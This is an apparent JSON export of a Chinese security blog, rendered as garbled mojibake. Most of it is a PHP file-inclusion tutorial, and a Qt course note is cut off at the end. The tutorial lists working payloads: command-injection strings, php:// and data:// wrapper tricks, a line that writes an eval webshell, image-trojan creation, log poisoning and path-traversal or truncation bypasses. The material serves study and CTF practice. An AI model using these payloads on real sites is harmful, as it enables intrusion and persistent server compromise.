*.jpg&gt;ForceType:application&#x2F;x-httpd-phpSetHandler:application&#x2F;x-httpd-php&lt;&#x2F;Files&gt;&#x2F;&#x2F;1.jpg&lt;?phpphpinfo();?&gt;&#x2F;&#x2F;ä¼šå°†æ‰€æœ‰çš„jpgæ–‡ä»¶éƒ½æŒ‰ç…§phpæ¥è§£æ 0x08åŒæ–‡ä»¶ä¸Šä¼ ","categories":[{"name":"web","slug":"web","permalink":"https://pz1o.top/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://pz1o.top/tags/web/"}]},{"title":"æ–‡ä»¶åŒ…å«","slug":"æ–‡ä»¶åŒ…å«","date":"2020-12-09T15:21:27.000Z","updated":"2020-12-09T15:23:42.040Z","comments":true,"path":"2020/12/09/æ–‡ä»¶åŒ…å«/","link":"","permalink":"https://pz1o.top/2020/12/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/","excerpt":"","text":"ä»Šå¤©åœ¨æ•´ç†ç¡¬ç›˜çš„ä¸€äº›ä¸œè¥¿ï¼Œæœ‰äº›webå­¦çš„ä¸œè¥¿åˆä¸æƒ³æ‰”ï¼Œå°±ä¼ ä¸Šæ¥ã€‚ æ–‡ä»¶åŒ…å«0x01å®šä¹‰åœ¨é€šè¿‡æœåŠ¡å™¨è„šæœ¬çš„å‡½æ•°å¼•å…¥æ–‡ä»¶æ—¶ï¼Œç”±äºä¼ å…¥çš„æ–‡ä»¶åæ²¡æœ‰ç»è¿‡åˆç†çš„æ ¡éªŒï¼Œä»è€Œæ“ä½œäº†é¢„æƒ³ä¹‹å¤–çš„æ–‡ä»¶ï¼Œå¯¼è‡´æ„å¤–çš„æ–‡ä»¶æ³„éœ²ç”šè‡³æ¶æ„çš„ä»£ç æ³¨å…¥ã€‚ 0x02ç¯å¢ƒè¦æ±‚ allow_url_fopen=On(é»˜è®¤ä¸ºOn) è§„å®šæ˜¯å¦å…è®¸ä»è¿œç¨‹æœåŠ¡å™¨æˆ–è€…ç½‘ç«™æ£€ç´¢æ•°æ® allow_url_include=On(php5.2ä¹‹åé»˜è®¤ä¸ºOff) è§„å®šæ˜¯å¦å…è®¸include/requireè¿œç¨‹æ–‡ä»¶ 0x03æ–‡ä»¶åŒ…å«å‡½æ•° include():å¯è·å¾—æŒ‡å®šæ–‡ä»¶ä¸­çš„æ‰€æœ‰æ–‡æœ¬ï¼Œå¹¶æŠŠæ–‡æœ¬æ‹·è´åˆ°ä½¿ç”¨ include å‡½æ•°çš„æ–‡ä»¶ä¸­ã€‚include() å‡½æ•°ä¼šç”Ÿæˆä¸€ä¸ªè­¦å‘Šï¼Œä½†æ˜¯è„šæœ¬ä¼šç»§ç»­æ‰§è¡Œã€‚ require():å‡½æ•°æ¥å—çš„æ‰€æœ‰æ–‡æœ¬æ–‡ä»¶,å¹¶å°†å®ƒå¤åˆ¶åˆ°æŒ‡å®šçš„æ–‡ä»¶ä¸­ï¼Œä½¿ç”¨äº†åŒ…æ‹¬åŠŸèƒ½ã€‚å¦‚æœåœ¨åŠ è½½ä¸€ä¸ªæ–‡ä»¶æ—¶æœ‰ä»»ä½•é—®é¢˜ï¼Œç”Ÿæˆä¸€ä¸ªè‡´å‘½é”™è¯¯,åœæ­¢è„šæœ¬çš„æ‰§è¡Œã€‚ 0x04å‘½ä»¤æ‰§è¡Œhttps://www.ghtwf01.cn/index.php/archives/273/#menu_index_21 å®šä¹‰åº”ç”¨æœ‰æ—¶éœ€è¦è°ƒç”¨ä¸€äº›æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°ï¼Œå¦‚PHPä¸­çš„systemã€execã€shell_execã€ passthruã€popenã€proc_popenç­‰ï¼Œå½“ç”¨æˆ·èƒ½æ§åˆ¶è¿™äº›å‡½æ•°ä¸­çš„å‚æ•°æ—¶ï¼Œå°±å¯ä»¥å°†æ¶æ„ç³»ç»Ÿå‘½ä»¤ æ‹¼æ¥åˆ°æ­£å¸¸å‘½ä»¤ä¸­ï¼Œä»è€Œé€ æˆå‘½ä»¤æ‰§è¡Œæ”»å‡»ï¼Œè¿™å°±æ˜¯å‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚ åˆ©ç”¨æ¡ä»¶ åº”ç”¨è°ƒç”¨æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•° å°†ç”¨æˆ·è¾“å…¥ä½œä¸ºç³»ç»Ÿå‘½ä»¤çš„å‚æ•°æ‹¼æ¥åˆ°äº†å‘½ä»¤è¡Œä¸­ æ²¡æœ‰å¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œè¿‡æ»¤æˆ–è¿‡æ»¤ä¸ä¸¥ å¸¸ç”¨è¿æ¥ç¬¦ åœ¨Windowså’ŒLinuxä¸­æˆ‘ä»¬å¯ä»¥ä½¿ç”¨&amp;æ¥æ‰§è¡Œå¤šæ¡å‘½ä»¤ã€‚ |ï¼šå‰é¢å‘½ä»¤è¾“å‡ºç»“æœä½œä¸ºåé¢å‘½ä»¤çš„è¾“å…¥å†…å®¹ï¼›è¾“å…¥8.8.8.8|whoami ||ï¼šå‰é¢å‘½ä»¤æ‰§è¡Œå¤±è´¥çš„æ—¶å€™æ‰æ‰§è¡Œåé¢çš„å‘½ä»¤ &amp;&amp;ï¼šå‰é¢å‘½ä»¤æ‰§è¡ŒæˆåŠŸäº†æ‰æ‰§è¡Œåé¢çš„å‘½ä»¤ åœ¨Linuxä¸­è¿˜å¯ä»¥ç”¨ï¼›å·æ¥è¿æ¥ã€‚ å¸¸è§å‘½ä»¤æ‰§è¡Œå‡½æ•° systemï¼šæˆåŠŸæ‰§è¡Œè¿”å›ç»“æœçš„æœ€åä¸€è¡Œï¼Œå¦åˆ™è¿”å›FALSE execï¼šæˆåŠŸæ‰§è¡Œè¿”å›ç»“æœçš„æœ€åä¸€è¡Œ shell_execï¼šæˆåŠŸæ‰§è¡Œè¿”å›å…¨éƒ¨ç»“æœï¼Œå¦åˆ™è¿”å›NULL passthru ï¼šæŠŠå‘½ä»¤çš„è¿è¡Œç»“æœåŸæ ·åœ°ç›´æ¥è¾“å‡ºåˆ°æ ‡å‡†è¾“å‡ºè®¾å¤‡ä¸Š æ¼æ´åˆ©ç”¨è¯»å–æŒ‡å®šç›®å½•å†…å®¹ 1...|dir C:\\user è¯»å–æŒ‡å®šæ–‡ä»¶å†…å®¹ 18.8.8.8|type C:\\windows\\win.ini 0x05phpä¼ªåè®®PHP æä¾›äº†ä¸€äº›æ‚é¡¹è¾“å…¥/è¾“å‡ºï¼ˆIOï¼‰æµï¼Œå…è®¸è®¿é—® PHP çš„è¾“å…¥è¾“å‡ºæµã€æ ‡å‡†è¾“å…¥è¾“å‡ºå’Œé”™è¯¯æè¿°ç¬¦ï¼Œ å†…å­˜ä¸­ã€ç£ç›˜å¤‡ä»½çš„ä¸´æ—¶æ–‡ä»¶æµä»¥åŠå¯ä»¥æ“ä½œå…¶ä»–è¯»å–å†™å…¥æ–‡ä»¶èµ„æºçš„è¿‡æ»¤å™¨ã€‚ php://inputphp://input:å¯ä»¥è®¿é—®è¯·æ±‚çš„åŸå§‹æ•°æ®çš„åªè¯»æµï¼Œå°†postè¯·æ±‚çš„æ•°æ®å½“ä½œphpä»£ç æ‰§è¡Œã€‚å½“ä¼ å…¥çš„å‚æ•°ä½œä¸ºæ–‡ä»¶åæ‰“å¼€æ—¶ï¼Œå¯ä»¥å°†å‚æ•°è®¾ä¸ºphp://input,åŒæ—¶postæƒ³è®¾ç½®çš„æ–‡ä»¶å†…å®¹ï¼Œphpæ‰§è¡Œæ—¶ä¼šå°†postå†…å®¹å½“ä½œæ–‡ä»¶å†…å®¹ï¼Œä»è€Œå¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œã€‚ åœ¨ctfä¸­ï¼Œphp://inputç”¨äºæ‰§è¡Œphpä»£ç ã€‚ é€šå¸¸ä¼šæœ‰ä¸¤ç§ç±»å‹ï¼š ä»»æ„ä»£ç æ‰§è¡Œ æ–‡ä»¶å†…å®¹ç»•è¿‡ 1&lt;?php fputs(fopen(â€œshell.phpâ€,â€wâ€),â€™&lt;?php eval($_POST[&quot;cmd&quot;];?&gt;â€™);?&gt; php://filterphp://filterå¯ä»¥è·å–æŒ‡å®šæ–‡ä»¶æºç ã€‚å½“å®ƒä¸åŒ…å«å‡½æ•°ç»“åˆæ—¶ï¼Œphp://filteræµä¼šè¢«å½“ä½œphpæ–‡ä»¶æ‰§è¡Œã€‚æ‰€ä»¥æˆ‘ä»¬ä¸€èˆ¬å¯¹å…¶è¿›è¡Œç¼–ç ï¼Œè®©å…¶ä¸æ‰§è¡Œã€‚ä»è€Œå¯¼è‡´ ä»»æ„æ–‡ä»¶è¯»å–ã€‚ 12?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;xxx.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;xxx.php zip://zip:// å¯ä»¥è®¿é—®å‹ç¼©åŒ…é‡Œé¢çš„æ–‡ä»¶ã€‚å½“å®ƒä¸åŒ…å«å‡½æ•°ç»“åˆæ—¶ï¼Œzip://æµä¼šè¢«å½“ä½œphpæ–‡ä»¶æ‰§è¡Œã€‚ä»è€Œå®ç°ä»»æ„ä»£ç æ‰§è¡Œã€‚ 123ä½¿ç”¨æ–¹æ³•zip:&#x2F;&#x2F;archive.zip#dir&#x2F;file.txtzip:&#x2F;&#x2F;[å‹ç¼©æ–‡ä»¶ç»å¯¹è·¯å¾„]#[å‹ç¼©æ–‡ä»¶å†…çš„å­æ–‡ä»¶å] 12345http:&#x2F;&#x2F;127.0.0.1&#x2F;cmd.php?file&#x3D;zip:&#x2F;&#x2F;D:&#x2F;soft&#x2F;phpStudy&#x2F;WWW&#x2F;file.jpg%23phpcode.txtå…ˆå°†è¦æ‰§è¡Œçš„PHPä»£ç å†™å¥½æ–‡ä»¶åä¸ºphpcode.txtï¼Œå°†phpcode.txtè¿›è¡Œzipå‹ç¼©,å‹ç¼©æ–‡ä»¶åä¸ºfile.zip,å¦‚æœå¯ä»¥ä¸Šä¼ zipæ–‡ä»¶ä¾¿ç›´æ¥ä¸Šä¼ ï¼Œè‹¥ä¸èƒ½ä¾¿å°†file.zipé‡å‘½åä¸ºfile.jpgååœ¨ä¸Šä¼ ï¼Œå…¶ä»–å‡ ç§å‹ç¼©æ ¼å¼ä¹Ÿå¯ä»¥è¿™æ ·æ“ä½œã€‚ç”±äº#åœ¨getè¯·æ±‚ä¸­ä¼šå°†åé¢çš„å‚æ•°å¿½ç•¥æ‰€ä»¥ä½¿ç”¨getè¯·æ±‚æ—¶å€™åº”è¿›è¡Œurlç¼–ç ä¸º%23ï¼Œä¸”æ­¤å¤„ç»è¿‡æµ‹è¯•ç›¸å¯¹è·¯å¾„æ˜¯ä¸å¯è¡Œï¼Œæ‰€ä»¥åªèƒ½ç”¨ç»å¯¹è·¯å¾„ã€‚ data://å’Œphar://data:// åŒæ ·ç±»ä¼¼ä¸php://inputï¼Œå¯ä»¥è®©ç”¨æˆ·æ¥æ§åˆ¶è¾“å…¥æµï¼Œå½“å®ƒä¸åŒ…å«å‡½æ•°ç»“åˆæ—¶ï¼Œç”¨æˆ·è¾“å…¥çš„data://æµä¼šè¢«å½“ä½œphpæ–‡ä»¶æ‰§è¡Œã€‚ä»è€Œå¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œã€‚ 12345data:&#x2F;&#x2F;[MIME-type][;charset&#x3D;&lt;encoding&gt;][;base64],&lt;data&gt;?file&#x3D;data:&#x2F;&#x2F;&lt;?php phpinfo()?&gt;?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php phpinfo()?&gt;?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpPz4&#x3D; phar:// æœ‰ç‚¹ç±»ä¼¼zip://åŒæ ·å¯ä»¥å¯¼è‡´ ä»»æ„ä»£ç æ‰§è¡Œã€‚ 12?file&#x3D;phar:&#x2F;&#x2F;zip.jpg&#x2F;cmd.php?file&#x3D;phar:&#x2F;&#x2F;D:\\zip.jpg\\cmd.php 0x06åŒ…å«Apacheæ—¥å¿—æ–‡ä»¶WEBæœåŠ¡å™¨ä¸€èˆ¬ä¼šå°†ç”¨æˆ·çš„è®¿é—®è®°å½•ä¿å­˜åœ¨è®¿é—®æ—¥å¿—ä¸­ã€‚é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æ ¹æ®æ—¥å¿—è®°å½•çš„å†…å®¹ï¼Œç²¾å¿ƒæ„é€ è¯·æ±‚ï¼ŒæŠŠPHPä»£ç æ’å…¥åˆ°æ—¥å¿—æ–‡ä»¶ä¸­ï¼Œé€šè¿‡æ–‡ä»¶åŒ…å«æ¼æ´æ¥æ‰§è¡Œæ—¥å¿—ä¸­çš„PHPä»£ç ã€‚ åˆ©ç”¨æ¡ä»¶ï¼š å¯¹æ—¥å¿—æ–‡ä»¶å¯è¯» çŸ¥é“æ—¥å¿—æ–‡ä»¶çš„å­˜å‚¨ç›®å½• 12 Apacheè¿è¡Œåä¸€èˆ¬é»˜è®¤ä¼šç”Ÿæˆä¸¤ä¸ªæ—¥å¿—æ–‡ä»¶ï¼ŒWindosä¸‹æ˜¯access.logï¼ˆè®¿é—®æ—¥å¿—ï¼‰å’Œerror.log(é”™è¯¯æ—¥å¿—)ï¼ŒLinuxä¸‹æ˜¯access_logå’Œerror_logï¼Œè®¿é—®æ—¥å¿—æ–‡ä»¶è®°å½•äº†å®¢æˆ·ç«¯çš„æ¯æ¬¡è¯·æ±‚å’ŒæœåŠ¡å™¨å“åº”çš„ç›¸å…³ä¿¡æ¯ã€‚ å¦‚æœè®¿é—®ä¸€ä¸ªä¸å­˜åœ¨çš„èµ„æºæ—¶ï¼Œå¦‚http:&#x2F;&#x2F;www.xxxx.com&#x2F;&lt;?php phpinfo(); ?&gt;,åˆ™ä¼šè®°å½•åœ¨æ—¥å¿—ä¸­ï¼Œä½†æ˜¯ä»£ç ä¸­çš„æ•æ„Ÿå­—ç¬¦ä¼šè¢«æµè§ˆå™¨è½¬ç ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡burpsuitç»•è¿‡ç¼–ç ï¼Œå°±å¯ä»¥æŠŠ&lt;?php phpinfo(); ?&gt; å†™å…¥apacheçš„æ—¥å¿—æ–‡ä»¶ï¼Œç„¶åå¯ä»¥é€šè¿‡åŒ…å«æ—¥å¿—æ–‡ä»¶æ¥æ‰§è¡Œæ­¤ä»£ç ï¼Œä½†å‰ææ˜¯ä½ å¾—çŸ¥é“apacheæ—¥å¿—æ–‡ä»¶çš„å­˜å‚¨è·¯å¾„ï¼Œæ‰€ä»¥ä¸ºäº†å®‰å…¨èµ·è§ï¼Œå®‰è£…apacheæ—¶å°½é‡ä¸è¦ä½¿ç”¨é»˜è®¤è·¯å¾„ã€‚ 0x07åŒ…å«SESSIONå¯ä»¥å…ˆæ ¹æ®å°è¯•åŒ…å«åˆ°SESSIONæ–‡ä»¶ï¼Œåœ¨æ ¹æ®æ–‡ä»¶å†…å®¹å¯»æ‰¾å¯æ§å˜é‡ï¼Œåœ¨æ„é€ payloadæ’å…¥åˆ°æ–‡ä»¶ä¸­ï¼Œæœ€ååŒ…å«å³å¯ã€‚ åˆ©ç”¨æ¡ä»¶ï¼š æ‰¾åˆ°SESSIONå†…çš„å¯æ§å˜é‡ SESSIONæ–‡ä»¶å¯è¯»å†™ï¼Œå¹¶ä¸”çŸ¥é“å­˜å‚¨è·¯å¾„ phpçš„sessionæ–‡ä»¶çš„ä¿å­˜è·¯å¾„å¯ä»¥åœ¨phpinfoçš„session.save_pathçœ‹åˆ°ã€‚ 0x08åŒ…å«ä¸´æ—¶æ–‡ä»¶phpä¸­ä¸Šä¼ æ–‡ä»¶ï¼Œä¼šåˆ›å»ºä¸´æ—¶æ–‡ä»¶ã€‚åœ¨linuxä¸‹ä½¿ç”¨/tmpç›®å½•ï¼Œè€Œåœ¨windowsä¸‹ä½¿ç”¨c:\\winsdows\\tempç›®å½•ã€‚åœ¨ä¸´æ—¶æ–‡ä»¶è¢«åˆ é™¤ä¹‹å‰ï¼Œåˆ©ç”¨ç«äº‰å³å¯åŒ…å«è¯¥ä¸´æ—¶æ–‡ä»¶ã€‚ ç”±äºåŒ…å«éœ€è¦çŸ¥é“åŒ…å«çš„æ–‡ä»¶åã€‚ä¸€ç§æ–¹æ³•æ˜¯è¿›è¡Œæš´åŠ›çŒœè§£ï¼Œlinuxä¸‹ä½¿ç”¨çš„éšæœºå‡½æ•°æœ‰ç¼ºé™·ï¼Œè€Œwindowä¸‹åªæœ‰65535ä¸­ä¸åŒçš„æ–‡ä»¶åï¼Œæ‰€ä»¥è¿™ä¸ªæ–¹æ³•æ˜¯å¯è¡Œçš„ã€‚ 0x09åŒ…å«ä¸Šä¼ æ–‡ä»¶å¾ˆå¤šç½‘ç«™é€šå¸¸ä¼šæä¾›æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ï¼Œæ¯”å¦‚ï¼šä¸Šä¼ å¤´åƒã€æ–‡æ¡£ç­‰ï¼Œè¿™æ—¶å°±å¯ä»¥é‡‡å–ä¸Šä¼ ä¸€å¥è¯å›¾ç‰‡æœ¨é©¬çš„æ–¹å¼è¿›è¡ŒåŒ…å«ã€‚ 1234567å›¾ç‰‡é©¬çš„åˆ¶ä½œæ–¹å¼å¦‚ä¸‹ï¼Œåœ¨cmdæ§åˆ¶å°ä¸‹è¾“å…¥ï¼šè¿›å…¥1.jpgå’Œ2.phpçš„æ–‡ä»¶ç›®å½•åï¼Œæ‰§è¡Œï¼šcopy 1.jpg&#x2F;b+2.php 3.jpgå°†å›¾ç‰‡1.jpgå’ŒåŒ…å«phpä»£ç çš„2.phpæ–‡ä»¶åˆå¹¶ç”Ÿæˆå›¾ç‰‡é©¬3.jpg 12345å‡è®¾å·²ç»ä¸Šä¼ ä¸€å¥è¯å›¾ç‰‡æœ¨é©¬åˆ°æœåŠ¡å™¨ï¼Œè·¯å¾„ä¸º&#x2F;upload&#x2F;201811.jpgå›¾ç‰‡ä»£ç å¦‚ä¸‹ï¼š&lt;?fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&quot;&lt;?php eval($_POST[&#39;pass&#39;]);?&gt;&quot;)?&gt;ç„¶åè®¿é—®URLï¼šhttp:&#x2F;&#x2F;www.xxxx.com&#x2F;index.php?page&#x3D;.&#x2F;upload&#x2F;201811.jpgï¼ŒåŒ…å«è¿™å¼ å›¾ç‰‡ï¼Œå°†ä¼šåœ¨index.phpæ‰€åœ¨çš„ç›®å½•ä¸‹ç”Ÿæˆshell.php ç»•è¿‡æ–¹æ³•0x10æŒ‡å®šå‰ç¼€ç»•è¿‡ç›®å½•éå†ä½¿ç”¨../../è¿”å›ä¸Šä¸€ç›®å½•ï¼Œç§°ä¸ºç›®å½•éå† 1?file&#x3D;..&#x2F;..&#x2F;Flag&#x2F;flag.txt æµ‹è¯•ä»£ç  12345678&lt;?php error_reporting(0); $file = $_GET[\"file\"]; //å‰ç¼€ include \"/var/www/html/\".$file; highlight_file(__FILE__);?&gt; ç¼–ç ç»•è¿‡ urlç¼–ç  123456789..&#x2F;%2e%2e%2f..%2f%2e%2e&#x2F;..\\%2e%2e%5c..%5c%2e%2e\\ äºŒæ¬¡ç¼–ç  12345..&#x2F;%252e%252e%252f..\\%252e%252e%255c å®¹å™¨/æœåŠ¡å™¨ç¼–ç  123456..&#x2F;..%c0%af%c0%ae%c0%ae&#x2F;..\\..%c1%9c 0x11æŒ‡å®šåç¼€ç»•è¿‡åç¼€æµ‹è¯•ä»£ç  12345678&lt;?php error_reporting(0); $file = $_GET[\"file\"]; //åç¼€ include $file.\".txt\"; highlight_file(__FILE__);?&gt; åˆ©ç”¨urlå®Œæ•´urlæ ¼å¼ï¼š 1protocol :&#x2F;&#x2F; hostname[:port] &#x2F; path &#x2F; [;parameters][?query]#fragment query(?) 1234&#x2F;&#x2F;æ‹¼æ¥å‚æ•°?file&#x3D;http:&#x2F;&#x2F;localhost:8080&#x2F;phpinfo.php?&#x2F;&#x2F;æ‹¼æ¥å?file&#x3D;http:&#x2F;&#x2F;localhost:8081&#x2F;phpinfo.php?.txt fragment(#) 1234&#x2F;&#x2F;æ‹¼æ¥å‚æ•°?file&#x3D;http:&#x2F;&#x2F;localhost:8081&#x2F;phpinfo.php%23&#x2F;&#x2F;æ‹¼æ¥å?file&#x3D;http:&#x2F;&#x2F;localhost:8081&#x2F;phpinfo.php#.txt åˆ©ç”¨åè®®zip:// 1234&#x2F;&#x2F;æ‹¼æ¥å‚æ•°?file&#x3D;zip:&#x2F;&#x2F;[å‹ç¼©æ–‡ä»¶ç»å¯¹è·¯å¾„]%23phpinfo&#x2F;&#x2F;æ‹¼æ¥å?file&#x3D;zip:&#x2F;&#x2F;[å‹ç¼©æ–‡ä»¶ç»å¯¹è·¯å¾„]%23phpinfo.txt phar:// 1234&#x2F;&#x2F;æ‹¼æ¥å‚æ•°?file&#x3D;phar:&#x2F;&#x2F;php.zip&#x2F;phpinfo&#x2F;&#x2F;æ‹¼æ¥å?file&#x3D;phar:&#x2F;&#x2F;php.zip&#x2F;phpinfo.txt é•¿åº¦æˆªæ–­åˆ©ç”¨æ¡ä»¶ï¼š phpç‰ˆæœ¬ &lt; php 5.2.8 åŸç†ï¼š Windowsä¸‹ç›®å½•æœ€å¤§é•¿åº¦ä¸º256å­—èŠ‚ï¼Œè¶…å‡ºçš„éƒ¨åˆ†ä¼šè¢«ä¸¢å¼ƒ Linuxä¸‹ç›®å½•æœ€å¤§é•¿åº¦ä¸º4096å­—èŠ‚ï¼Œè¶…å‡ºçš„éƒ¨åˆ†ä¼šè¢«ä¸¢å¼ƒã€‚ åˆ©ç”¨æ–¹æ³•ï¼š åªéœ€è¦ä¸æ–­çš„é‡å¤ ./(Windowsç³»ç»Ÿä¸‹ä¹Ÿå¯ä»¥ç›´æ¥ç”¨ . æˆªæ–­) 12 ?file&#x3D;.&#x2F;.&#x2F;.&#x2F;ã€‚ã€‚ã€‚çœç•¥ã€‚ã€‚ã€‚.&#x2F;.&#x2F;shell.php1 åˆ™æŒ‡å®šçš„åç¼€.txtä¼šåœ¨è¾¾åˆ°æœ€å¤§å€¼åä¼šè¢«ç›´æ¥ä¸¢å¼ƒæ‰ %00æˆªæ–­åˆ©ç”¨æ¡ä»¶ï¼š magic_quotes_gpc = Off phpç‰ˆæœ¬ &lt; php 5.3.4 åˆ©ç”¨æ–¹æ³•ï¼š ç›´æ¥åœ¨æ–‡ä»¶åçš„æœ€ååŠ ä¸Š%00æ¥æˆªæ–­æŒ‡å®šçš„åç¼€å 12 ?file&#x3D;shell.php%001 æ³¨ï¼šç°åœ¨ç”¨åˆ°%00é˜¶æ®µçš„æƒ…å†µå·²ç»ä¸å¤šäº† 0x12é€šè¿‡phpinfoå»Getshellhttps://cloud.tencent.com/developer/article/1609810 phpinfoæ–‡ä»¶æ³„éœ²ä¸€ç›´è¢«å¤§å®¶æ‰€å¿½è§†ï¼Œä½†å…¶å®phpinfoå¯ä»¥ä¸ºæ”»å‡»æ¸—é€æµ‹è¯•äººå‘˜æä¾›å¾ˆå¤šçš„ä¿¡æ¯ã€‚ 1.system æä¾›æœåŠ¡å™¨æ‰€åœ¨çš„æ“ä½œç³»ç»Ÿçš„ä¿¡æ¯ã€‚ 2.çœŸå®ip çŸ¥é“çœŸå®ipçš„æˆ‘ä»¬å¯ä»¥çœå»cdnå¸¦æ¥çš„å„ç§å›°æ‰°ã€‚æˆ‘ä»¬åŒæ—¶ä¹Ÿå¯ä»¥ç«¯å£æ—ç«™ä¸€é¡¿æ“ä½œã€‚ 3.webæ ¹ç›®å½• ç½‘ç«™ç»å¯¹è·¯å¾„å¯¹æ¸—é€æµ‹è¯•ç›¸å½“çš„æœ‰ç”¨ï¼Œå½“ä½ æ‰¾åˆ°SQLæ³¨å…¥ç‚¹æ—¶ï¼Œè¦ä¸Šä¼ æœ¨é©¬çš„æ—¶å€™å°±éœ€è¦çŸ¥é“ç½‘ç«™çš„ç»å¯¹è·¯å¾„æ‰å¯ä»¥è·å–webshellã€‚å‡å¦‚è¯¥ç½‘ç«™ä½¿ç”¨çš„æ˜¯å¦‚xamppä¹‹ç±»çš„å¿«é€Ÿæ­å»ºçš„è½¯ä»¶ï¼Œä½ ä¾¿å¯ä»¥å¯»æ‰¾è¯¥è½¯ä»¶å¯¹åº”çš„æ¼æ´å»å°è¯•æ”»å‡»ç›®æ ‡ç½‘ç«™ã€‚ disable_functions é€šè¿‡disable_functionsä½ å¯ä»¥äº†è§£åˆ°è¯¥ç½‘ç«™ç¦ç”¨äº†äº›ä»€ä¹ˆå‡½æ•°ï¼Œç„¶åå»ç»•è¿‡ä»£ç æ‰§è¡Œå’Œç¼–å†™webshellæ—¶é‡åˆ°çš„é—®é¢˜ã€‚ ä¸´æ—¶æ–‡ä»¶è·¯å¾„ è¿™æ¬¡é€šè¿‡phpinfoæ¥getshellçš„å…³é”®ï¼Œphpinfoå¯ä»¥è®©æˆ‘ä»¬è·å¾—ä¸´æ—¶æ–‡ä»¶è·¯å¾„ã€‚å‘phpinfoé¡µé¢postæ¶æ„ä»£ç ï¼Œå¯ä»¥åœ¨_FILES[â€œfile1â€]ä¸­çœ‹åˆ°ä¸Šä¼ çš„ä¸´æ—¶æ–‡ä»¶ï¼Œå¦‚æœè¯¥ç½‘ç«™å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œä¾¿å¯ä»¥å°†æ¶æ„ä»£ç å­˜å‚¨æˆ‘ä»¬å·²çŸ¥çš„ç»å¯¹è·¯å¾„å»åŒ…å«å®ƒgetshellã€‚","categories":[{"name":"web","slug":"web","permalink":"https://pz1o.top/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://pz1o.top/tags/web/"},{"name":"æ–‡ä»¶åŒ…å«","slug":"æ–‡ä»¶åŒ…å«","permalink":"https://pz1o.top/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"}]},{"title":"å¤§äºŒç¨‹åºè®¾è®¡ç»¼åˆå®è·µ","slug":"å¤§äºŒç¨‹åºè®¾è®¡ç»¼åˆå®è·µ","date":"2020-12-07T06:32:17.000Z","updated":"2020-12-14T00:41:59.076Z","comments":true,"path":"2020/12/07/å¤§äºŒç¨‹åºè®¾è®¡ç»¼åˆå®è·µ/","link":"","permalink":"https://pz1o.top/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/","excerpt":"","text":"ç¨‹åºè®¾è®¡ç»¼åˆå®è·µå›¾å½¢åŒ–ç¼–ç¨‹ è¿™ä¸åŒè¯­è¨€åˆ†æ•°è¿˜ä¸å¤ªä¸€æ ·ï¼Œæœ€åç”¨Qtäº† å››ä¸ªæ˜ŸæœŸå››ä¸ªå®éªŒï¼Œåº”è¯¥é—®é¢˜ä¸å¤§ è¶ä¸‹æ¬¡æ¯”èµ›ä¹‹å‰æŠŠè¿™ä¸ªå®éªŒå¼„å®Œ å…ˆè´´é“¾æ¥ https://www.bilibili.com/video/BV1g4411H78N?from=search&amp;seid=13020735672539057046 ä¸‹é¢å°½é‡ç”¨ä»£ç å’Œæ³¨é‡Šä»‹ç»åŸºç¡€çŸ¥è¯†ï¼Œå†™å¾—æœ‰ç‚¹ä¹±ï¼Œå¯ä»¥çœ‹bç«™å»å­¦ ä¸»è¦æ˜¯è‡ªå·±è®°å½•ä¸€ä¸‹çŸ¥è¯† æˆ‘ç”¨çš„æ˜¯5.14çš„ bç«™åº”è¯¥æ˜¯5.5çš„ æœ‰äº›çŸ¥è¯†ä¼šæœ‰ç‚¹å‡ºå…¥ Qt0x01 åˆ›å»ºqté¡¹ç›®å®‰è£…å®Œæˆå å¯ä»¥å…ˆçœ‹ä¸€ä¸‹ä¸Šé¢è¿™ä¸ªå†…å®¹ 1.æ–°å»ºé¡¹ç›®é€‰ç¬¬ä¸€ä¸ª ä¸€ç›´é»˜è®¤ï¼Œç›´åˆ°é€‰ç±»å ä¹‹åä¸€ç›´é»˜è®¤å°±å¯ä»¥äº† æœ€ç»ˆç•Œé¢å¦‚å›¾ 2. .proæ–‡ä»¶1234567QT += core gui //åŒ…å«çš„æ¨¡å—greaterThan(QT_MAJOR_VERSION, 4): QT += widgets //å¤§äºQt4ç‰ˆæœ¬ æ‰åŒ…å«widgetæ¨¡å—TARGET = QtFirst //åº”ç”¨ç¨‹åºå ç”Ÿæˆçš„.exeç¨‹åºåç§°TEMPLATE = app //æ¨¡æ¿ç±»å‹ åº”ç”¨ç¨‹åºæ¨¡æ¿SOURCES += main.cpp\\ //æºæ–‡ä»¶ mywidget.cppHEADERS += mywidget.h //å¤´æ–‡ä»¶ \\.proå°±æ˜¯å·¥ç¨‹æ–‡ä»¶(project)ï¼Œå®ƒæ˜¯qmakeè‡ªåŠ¨ç”Ÿæˆçš„ç”¨äºç”Ÿäº§makefileçš„é…ç½®æ–‡ä»¶**ã€‚ 3.main.cpp1234567891011121314#include \"mainwindow.h\"#include &lt;QApplication&gt;int main(int argc, char *argv[])&#123; //a åº”ç”¨ç¨‹åºå¯¹è±¡ åœ¨Qtä¸­ æœ‰ä¸”ä»…æœ‰ä¸€ä¸ª QApplication a(argc, argv); //çª—å£å¯¹è±¡ MainWindow MainWindow w; //å¿…é¡»è¦showæ–¹æ³•æ‰å¯ä»¥å±•ç¤º w.show(); return a.exec();&#125; è§£é‡Šï¼š Qtç³»ç»Ÿæä¾›çš„æ 